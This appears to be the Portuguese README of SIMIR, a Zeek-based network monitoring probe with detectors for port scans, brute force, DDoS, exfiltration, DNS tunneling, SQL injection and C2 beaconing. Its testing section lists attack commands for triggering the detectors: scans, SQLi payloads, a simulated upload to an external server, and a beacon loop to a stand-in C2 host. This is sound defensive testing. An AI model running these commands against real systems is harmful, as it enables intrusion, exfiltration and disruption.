# SIMIR - Sonda Inteligente de Monitoramento Interno da Rede
Sonda integrante do projeto GT-IoTEdu

### Inicialização Rápida

```bash
# Configuração e inicialização completa em um comando
./start.sh
```

### Gerenciamento do Sistema

```bash
# Interface completa de gerenciamento
./scripts/simir-control.sh

# Comandos diretos disponíveis:
./scripts/simir-control.sh start         # Iniciar sistema
./scripts/simir-control.sh status        # Ver status
./scripts/simir-control.sh simulate      # Simular port scan
```

## Estrutura do Projeto

```
├── docker-compose.yml    # Configuração do Docker Compose
├── Dockerfile           # Definição da imagem Docker
├── start-simir.sh       # Inicialização rápida do sistema
├── scripts/            # Scripts do projeto
│   ├── essential/      # Scripts críticos (NÃO DELETAR - usados no Dockerfile)
│   │   ├── entrypoint.sh       # Script de entrada do container
│   │   ├── check-interface.sh  # Verificação de interface
│   │   ├── setup-permissions.sh # Configuração de permissões
│   │   ├── simir-monitor.py    # Monitor de logs
│   │   └── simir-autostart.sh  # Auto-inicialização
│   ├── simir-control.sh           # Interface de controle completa
│   ├── compartilhar-internet.sh   # Compartilhamento de internet
│   ├── verificar-internet.sh      # Verificação de conectividade
│   ├── update-threat-feeds.sh     # Atualização de feeds de ameaças
│   ├── test-brute-force.sh        # Teste de detecção de força bruta
│   ├── test-intelligence.sh       # Teste do Intelligence Framework
│   ├── test-intelligence-complete.sh  # Teste completo de intelligence
│   ├── test-complete.sh           # Teste completo do sistema
│   └── README.md                  # Documentação dos scripts
├── site/               # Configurações e scripts Zeek
│   ├── local.zeek                      # Configuração principal
│   ├── simir-notice-standards.zeek     # Padrões de alertas SIMIR
│   ├── port-scan-detector.zeek         # Detector de port scan
│   ├── brute-force-detector.zeek       # Detector de força bruta
│   ├── ddos-detector.zeek              # Detector de DDoS
│   ├── intelligence-framework.zeek     # Framework de inteligência de ameaças
│   ├── data-exfiltration-detector.zeek # Detector de exfiltração de dados
│   ├── dns-tunneling-detector.zeek     # Detector de DNS tunneling
│   ├── lateral-movement-detector.zeek  # Detector de movimento lateral
│   ├── sql-injection-detector.zeek     # Detector de SQL Injection
│   ├── beaconing-detector.zeek         # Detector de beaconing (C2)
│   ├── protocol-anomaly-detector.zeek  # Detector de anomalias de protocolo
│   ├── icmp-tunnel-detector.zeek       # Detector de ICMP tunneling
│   └── intel/                          # Feeds de inteligência de ameaças
├── logs/              # Logs do Zeek (ignorados pelo git exceto notice.log)
└── docs/              # Documentação
```

**Nota**: A pasta `scripts/essential/` contém scripts essenciais usados no Dockerfile. Não delete esta pasta ou seus arquivos!

## Sistema de Detecção de Ameaças

O SIMIR implementa 11 módulos especializados de detecção de ameaças, cada um focado em um vetor de ataque específico:

### Detectores Implementados

| Detector | Descrição | Tipos de Detecção |
|----------|-----------|-------------------|
| **Port Scan** | Identifica varreduras de portas | Horizontal, Vertical, Portas Fechadas, Portas Críticas |
| **Brute Force** | Detecta ataques de força bruta | SSH, FTP, HTTP AUTH, Múltiplos Usuários |
| **DDoS** | Identifica ataques de negação de serviço | SYN Flood, Volume, Conexões por Segundo |
| **Intelligence** | Correlaciona com feeds de ameaças | IPs Maliciosos, Domínios, URLs, Botnet C2 |
| **Data Exfiltration** | Detecta vazamento de dados | Upload Grande, Download Massivo, Múltiplos Destinos |
| **DNS Tunneling** | Identifica abuso de DNS | Alta Entropia, Subdomínios Longos, NXDOMAIN, TXT Queries |
| **Lateral Movement** | Detecta movimento interno | RDP, SSH, SMB Scanning, Múltiplas Portas Admin |
| **SQL Injection** | Detecta ataques SQLi | UNION SELECT, DROP TABLE, Blind SQLi, Error Disclosure |
| **Beaconing** | Identifica comunicação C2 | Intervalos Regulares, Payload Similar, Periodicidade |
| **Protocol Anomaly** | Detecta uso anormal de protocolos | Portas Não-Padrão, SSL Inválido, Protocolos Inesperados |
| **ICMP Tunnel** | Identifica tunneling via ICMP | Payload Grande, Alto Volume, Padrões Anormais |

### Características dos Detectores

####  Detecção Avançada
- **Análise Comportamental**: Identifica padrões de ataque baseados em comportamento
- **Machine Learning Ready**: Estrutura preparada para integração com ML
- **Correlação de Eventos**: Múltiplos detectores trabalhando em conjunto
- **Redução de Falsos Positivos**: Lógica inteligente para filtrar tráfego legítimo

####  Classificação de Severidade
Todos os detectores classificam alertas em 4 níveis:
- **CRITICAL**: Ameaça confirmada, requer ação imediata
- **HIGH**: Comportamento altamente suspeito
- **MEDIUM**: Atividade anormal que requer investigação
- **LOW**: Atividade potencialmente suspeita

####  Configurabilidade
Cada detector possui thresholds ajustáveis via `&redef`:
```zeek
# Exemplo: Ajustar threshold de port scan
redef PortScan::port_threshold = 10;           # Número de portas
redef PortScan::scan_timeout = 5min;           # Janela de tempo

# Exemplo: Ajustar threshold de brute force
redef BruteForce::auth_attempt_threshold = 5;  # Tentativas falhas
redef BruteForce::auth_timeout = 15min;        # Período de análise
```

####  Formato de Log Estruturado
Todos os detectores populam campos estruturados no `notice.log`:
- **proto**: Protocolo (tcp/udp/icmp)
- **src**: IP de origem (atacante)
- **dst**: IP de destino (vítima)
- **p**: Porta envolvida
- **n**: Contador (tentativas/conexões/portas)
- **sub**: Contexto adicional
- **msg**: Mensagem descritiva com detalhes

### Tipos de Detecção Detalhados

#### Port Scan Detection
Detecta varreduras de rede com 4 tipos:
- **Horizontal Scan**: Múltiplas portas em um único host
- **Vertical Scan**: Mesma porta em múltiplos hosts
- **Closed Port Scan**: Tentativas em portas fechadas
- **Critical Port Scan**: Acesso a portas sensíveis (SSH, RDP, SMB, etc.)

**Portas Críticas Monitoradas**: 22 (SSH), 23 (Telnet), 445 (SMB), 3389 (RDP), 1433 (MSSQL), 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 27017 (MongoDB)

#### Brute Force Detection
Protege contra ataques de autenticação:
- **SSH Brute Force**: Tentativas de login SSH
- **FTP Brute Force**: Ataques em servidores FTP
- **HTTP Auth Brute Force**: Força bruta em autenticação HTTP
- **Multiple Users**: Tentativas em múltiplas contas (credential stuffing)

**Thresholds Padrão**: 5 tentativas falhas em 15 minutos

####  DDoS Detection
Identifica ataques de negação de serviço:
- **SYN Flood**: Inundação de pacotes SYN
- **Connection Volume**: Volume anormal de conexões
- **High Connection Rate**: Taxa de conexão por segundo elevada
- **Distributed Attack**: Múltiplas origens atacando um alvo

**Thresholds**: 100 conexões em 60s ou 1000 conexões totais

####  Intelligence Framework
Correlaciona tráfego com feeds de ameaças:
- **Malicious IPs**: IPs conhecidos maliciosos (Feodo, Spamhaus DROP)
- **Malware Domains**: Domínios de distribuição de malware
- **Botnet C2**: Servidores de comando e controle
- **TOR Exit Nodes**: Nós de saída TOR
- **URLhaus**: URLs maliciosas

**Feeds Integrados**: Feodo Tracker, Spamhaus DROP, URLhaus, Suricata, TOR Project

#### Data Exfiltration Detection
Detecta vazamento de dados sensíveis:
- **Large Upload**: Upload > 100 MB em curto período
- **Massive Download**: Download > 500 MB
- **Massive Transfer**: Transferência > 1 GB
- **Multiple External Transfers**: Uploads para múltiplos IPs externos

**Thresholds**: Upload 100MB, Download 500MB, Massivo 1GB

#### 🕳 DNS Tunneling Detection
Identifica abuso de DNS para C2/exfiltração:
- **High Entropy**: Queries com alta entropia (Shannon > 3.5)
- **Long Subdomain**: Subdomínios > 60 caracteres
- **Excessive NXDOMAIN**: Múltiplas respostas NXDOMAIN (DGA)
- **Large TXT Query**: Queries TXT suspeitas
- **Encoding Pattern**: Detecção de Base64/Hex encoding

**Algoritmo**: Cálculo de entropia de Shannon para strings aleatórias

#### Lateral Movement Detection
Identifica movimento dentro da rede:
- **RDP Lateral Movement**: Conexões RDP (3389) para múltiplos hosts internos
- **SSH Lateral Movement**: SSH (22) scanning interno
- **SMB Lateral Movement**: SMB (445) scanning
- **Admin Port Scanning**: Varredura de múltiplas portas administrativas
- **Internal Host Scanning**: Scanning generalizado interno

**Threshold**: Conexões para 5+ hosts internos em 15 minutos

#### SQL Injection Detection
Detecta tentativas de SQLi com 30+ padrões:
- **Union-Based SQLi**: `UNION SELECT` attacks
- **Boolean-Based**: `OR 1=1`, `AND 1=1`
- **Time-Based**: `WAITFOR DELAY`, `SLEEP()`
- **Stacked Queries**: `;DROP TABLE`, múltiplos statements
- **Comment Injection**: `--`, `/**/`, admin bypass
- **SQL Error Disclosure**: Detecção de erros SQL expostos

**Classificação de Severidade Automática**: Padrões críticos (DROP, DELETE) vs médios (OR 1=1)

#### Beaconing Detection
Identifica comunicação periódica de C2:
- **Regular Intervals**: Conexões em intervalos regulares (5s-5min)
- **Similar Payload**: Tamanhos de payload similares
- **High Regularity**: Variação < 15% (jitter baixo)

**Algoritmo**: Calcula variância e coeficiente de variação dos intervalos. Requer mínimo 10 conexões.

####  Protocol Anomaly Detection
Detecta uso anormal de protocolos:
- **HTTP on Non-Standard Port**: HTTP em portas != 80/8080/8000
- **HTTPS on Non-Standard Port**: HTTPS != 443/8443
- **SSH on Non-Standard Port**: SSH != 22
- **Invalid SSL Certificate**: Certificados inválidos/auto-assinados
- **High Port Activity**: Atividade em portas > 40000
- **Unexpected Protocol**: Protocolo inesperado em porta padrão

#### 🔊 ICMP Tunnel Detection
Identifica tunneling via ICMP:
- **Large Payload**: Payload > 128 bytes (normal = 64)
- **High Volume**: > 100 pacotes ICMP em 5 minutos
- **Unusual Pattern**: Padrões de ICMP unreachable anormais
- **Data Exfiltration via ICMP**: Transferência de dados via ping

**Baseline**: Ping normal = 64 bytes, suspeito > 128 bytes

### Características:
### Características Gerais do Sistema:
- **11 Detectores Especializados**: Cobertura abrangente de vetores de ataque
- **Detecção Inteligente**: Algoritmos avançados para identificar padrões de ataque
- **Threat Intelligence**: Feeds atualizados de IPs e domínios maliciosos
- **Análise de Severidade**: Classificação automática (LOW, MEDIUM, HIGH, CRITICAL)
- **Logs Estruturados**: Formato TSV com campos padronizados para análise
- **Baixo Índice de Falsos Positivos**: Lógica de filtragem inteligente
- **Configurável**: Thresholds ajustáveis via &redef
- **Tempo Real**: Detecção e alerta instantâneos

### Tipos de Detecção:
- Port Scan Horizontal: Múltiplas portas em um host
- Port Scan Vertical: Mesma porta em múltiplos hosts  
- Tentativas em Portas Fechadas: Conexões rejeitadas suspeitas
- Scans Críticos: Portas sensíveis (SSH, RDP, SMB, etc.)
- Ataques de Força Bruta: Tentativas repetidas de autenticação
- Comunicação com IPs Maliciosos: Detecção via intelligence feeds
- Exfiltração de Dados: Transferências massivas suspeitas
- DNS Tunneling: Abuso de DNS para C2 e exfiltração
- Movimento Lateral: Scanning interno pós-comprometimento
- SQL Injection: Ataques de injeção SQL em aplicações web
- Beaconing: Comunicação periódica com C2
- Anomalias de Protocolo: Protocolos em portas não-padrão
- ICMP Tunneling: Exfiltração via ICMP

## Como usar

### Método Recomendado - Inicialização Rápida
```bash
# Inicia o sistema completo
./start-simir.sh
```

### Gerenciamento via Script de Controle
```bash
# Interface interativa completa
./scripts/simir-control.sh

# Comandos específicos
./scripts/simir-control.sh start         # Iniciar Zeek + Monitor
./scripts/simir-control.sh stop          # Parar tudo
./scripts/simir-control.sh status        # Status completo do sistema
./scripts/simir-control.sh simulate      # Simular port scan para teste
./scripts/simir-control.sh logs monitor  # Ver logs do monitor
```

### Comandos manuais do Docker
```bash
# Construir e iniciar
docker-compose up -d

# Ver logs
docker logs -f SIMIR_Z

# Parar
docker-compose down
```

## Configuração

### Interface de Rede
A interface de rede padrão é `enp0s31f6`. Para alterar, modifique a variável `ZEEK_INTERFACE` no `docker-compose.yml`.

### Variáveis de Ambiente (docker-compose.yml)
```yaml
environment:
  - ZEEK_INTERFACE=enp0s31f6  # Interface a ser monitorada
```

### Configurações de Detecção
O sistema pode ser ajustado através dos scripts Zeek em `site/`. Cada detector possui thresholds configuráveis:

#### Port Scan Detector (`port-scan-detector.zeek`)
```zeek
redef PortScan::port_threshold = 15;          # Portas para scan horizontal
redef PortScan::host_threshold = 10;          # Hosts para scan vertical
redef PortScan::scan_timeout = 5min;          # Janela de tempo
redef PortScan::closed_port_threshold = 10;   # Portas fechadas
```

#### Brute Force Detector (`brute-force-detector.zeek`)
```zeek
redef BruteForce::auth_attempt_threshold = 5;     # Tentativas falhas
redef BruteForce::auth_timeout = 15min;           # Período de análise
redef BruteForce::multiple_user_threshold = 3;    # Usuários diferentes
```

#### DDoS Detector (`ddos-detector.zeek`)
```zeek
redef DDoS::connection_threshold = 100;           # Conexões por período
redef DDoS::connection_rate_threshold = 50;       # Conexões por segundo
redef DDoS::ddos_timeout = 60sec;                 # Janela de análise
redef DDoS::massive_attack_threshold = 1000;      # Ataque massivo
```

#### Data Exfiltration Detector (`data-exfiltration-detector.zeek`)
```zeek
redef DataExfil::large_upload_threshold = 100 * 1024 * 1024;      # 100 MB
redef DataExfil::massive_download_threshold = 500 * 1024 * 1024;  # 500 MB
redef DataExfil::massive_threshold = 1024 * 1024 * 1024;          # 1 GB
redef DataExfil::tracking_interval = 5min;                        # Janela
```

#### DNS Tunneling Detector (`dns-tunneling-detector.zeek`)
```zeek
redef DNSTunnel::entropy_threshold = 3.5;         # Entropia de Shannon
redef DNSTunnel::long_subdomain_threshold = 60;   # Caracteres
redef DNSTunnel::nxdomain_threshold = 50;         # NXDOMAIN count
redef DNSTunnel::tracking_interval = 5min;        # Período
```

#### Lateral Movement Detector (`lateral-movement-detector.zeek`)
```zeek
redef LateralMove::host_threshold = 5;            # Hosts internos
redef LateralMove::admin_port_threshold = 5;      # Portas admin
redef LateralMove::tracking_interval = 15min;     # Janela
```

#### SQL Injection Detector (`sql-injection-detector.zeek`)
```zeek
# Sem thresholds numéricos - usa pattern matching
# Detecção baseada em 30+ padrões SQLi conhecidos
# Classificação automática de severidade
```

#### Beaconing Detector (`beaconing-detector.zeek`)
```zeek
redef Beaconing::min_connections = 10;            # Mínimo de conexões
redef Beaconing::jitter_threshold = 0.15;         # 15% de variação
redef Beaconing::min_interval = 5sec;             # Intervalo mínimo
redef Beaconing::max_interval = 5min;             # Intervalo máximo
```

#### Protocol Anomaly Detector (`protocol-anomaly-detector.zeek`)
```zeek
redef ProtoAnomaly::high_port_threshold = 40000;  # Portas altas
# Portas padrão definidas: HTTP (80,8080,8000), HTTPS (443,8443), SSH (22)
```

#### ICMP Tunnel Detector (`icmp-tunnel-detector.zeek`)
```zeek
redef ICMPTunnel::large_payload_threshold = 128;  # Bytes
redef ICMPTunnel::high_volume_threshold = 100;    # Pacotes
redef ICMPTunnel::tracking_interval = 5min;       # Período
```

#### Intelligence Framework (`intelligence-framework.zeek`)
```zeek
# Carrega feeds de: site/intel/*.txt
# Feeds suportados: IPs maliciosos, domínios, URLs, botnet C2
```

## Monitoramento e Logs

### Status do Sistema
```bash
./scripts/simir-control.sh status
```

### Logs em Tempo Real
```bash
# Logs do monitor SIMIR
./scripts/simir-control.sh logs monitor

# Logs do container Zeek
./scripts/simir-control.sh logs zeek

# Apenas alertas
./scripts/simir-control.sh logs alerts
```

### Localização de Logs
- Monitor SIMIR: `/tmp/simir_monitor.log`
- Container Zeek: `docker-compose logs`
- Zeek Notice: `/usr/local/zeek/spool/zeek/notice.log`
- Logs gerais do Zeek: `/usr/local/zeek/logs/`

## Testes

O SIMIR inclui scripts de teste para validar cada detector:

### Testar Detecção de Port Scan
```bash
# Simula port scan para testar detecção
./scripts/simir-control.sh simulate

# Ou manualmente com nmap
nmap -sS -F 127.0.0.1
nmap -p 1-100 192.168.1.1     # Horizontal scan
nmap -p 22 192.168.1.0/24     # Vertical scan
```

### Testar Intelligence Framework
```bash
# Teste básico
./scripts/test-intelligence.sh

# Teste completo com múltiplos feeds
./scripts/test-intelligence-complete.sh
```

### Testar Detecção de Força Bruta
```bash
./scripts/test-brute-force.sh

# Ou manualmente
for i in {1..10}; do ssh invalid_user@target_host; done
```

### Testar Data Exfiltration
```bash
# Simular upload grande
dd if=/dev/zero of=test_file bs=1M count=150
curl -F "file=@test_file" http://external-server/upload

# Simular download massivo
wget --limit-rate=10M http://external-server/large_file.iso
```

### Testar DNS Tunneling
```bash
# Queries com alta entropia
dig abcd1234efgh5678ijkl.malicious.com

# Subdomínio longo
dig $(python3 -c "print('a'*70)").test.com

# NXDOMAIN excessivo (DGA simulation)
for i in {1..60}; do dig random$RANDOM.nonexistent.com; done
```

### Testar Lateral Movement
```bash
# Simular scanning interno via RDP
for host in 192.168.1.{1..10}; do nc -zv $host 3389; done

# SSH scanning interno
for host in 192.168.1.{1..10}; do nc -zv $host 22; done
```

### Testar SQL Injection
```bash
# Simular ataques SQLi
curl "http://target/page.php?id=1' OR '1'='1"
curl "http://target/page.php?id=1' UNION SELECT null,null--"
curl "http://target/admin.php?user=admin'--"
```

### Testar Beaconing
```bash
# Simular comunicação periódica (C2)
while true; do 
  curl -s http://c2-server:8080/beacon > /dev/null
  sleep 30
done
```

### Testar Protocol Anomaly
```bash
# HTTP em porta não-padrão
python3 -m http.server 8888
curl http://localhost:8888

# SSH em porta customizada
ssh -p 2222 user@host
```

### Testar ICMP Tunnel
```bash
# Ping com payload grande
ping -s 200 target_host

# Alto volume de ICMP
ping -f target_host  # Flood ping (requer root)
```

### Teste Completo do Sistema
```bash
# Executa todos os testes
./scripts/test-complete.sh
```

### Verificar Resultados dos Testes
```bash
# Ver alertas em tempo real
./scripts/simir-control.sh logs alerts

# Ver notice.log diretamente
docker exec SIMIR_Z tail -f /usr/local/zeek/spool/zeek/notice.log

# Filtrar por tipo de detector
docker exec SIMIR_Z grep "PORT-SCAN" /usr/local/zeek/spool/zeek/notice.log
docker exec SIMIR_Z grep "BRUTE-FORCE" /usr/local/zeek/spool/zeek/notice.log
docker exec SIMIR_Z grep "DATA-EXFIL" /usr/local/zeek/spool/zeek/notice.log
docker exec SIMIR_Z grep "DNS-TUNNEL" /usr/local/zeek/spool/zeek/notice.log
docker exec SIMIR_Z grep "SQLi" /usr/local/zeek/spool/zeek/notice.log
```

## Troubleshooting

### Problemas Comuns

#### Port scan não está sendo detectado
1. Verifique se o Zeek está rodando: `./scripts/simir-control.sh status`
2. Simule um scan: `./scripts/simir-control.sh simulate`
3. Verifique logs do Zeek: `./scripts/simir-control.sh logs zeek`

#### Container não inicia
1. Verifique interface de rede no docker-compose.yml
2. Execute permissões: `sudo ./scripts/setup-permissions.sh`
3. Reconstrua: `docker-compose build --no-cache`

#### Intelligence feeds não estão sendo carregados
1. Atualize os feeds: `./scripts/update-threat-feeds.sh`
2. Verifique o diretório: `ls -la site/intel/`
3. Veja os logs: `docker logs SIMIR_Z`

### Logs Detalhados
Consulte `scripts/README.md` para informações detalhadas sobre troubleshooting.

### Comandos de Diagnóstico
```bash
# Status completo
./scripts/simir-control.sh status

# Reconstruir sistema
docker-compose down
docker-compose build --no-cache
./start-simir.sh

# Verificar interface de rede
ip addr show
```

### Localização de Logs
- `/tmp/simir_monitor.log` - Monitor Python
- `docker-compose logs` - Container Docker
- `/usr/local/zeek/spool/zeek/` - Logs do Zeek dentro do container

## Contribuindo

Contribuições são bem-vindas! Por favor, abra uma issue ou pull request para sugestões ou melhorias.

## Licença

Este projeto é parte do GT-IoTEdu. Consulte o arquivo LICENSE para detalhes.
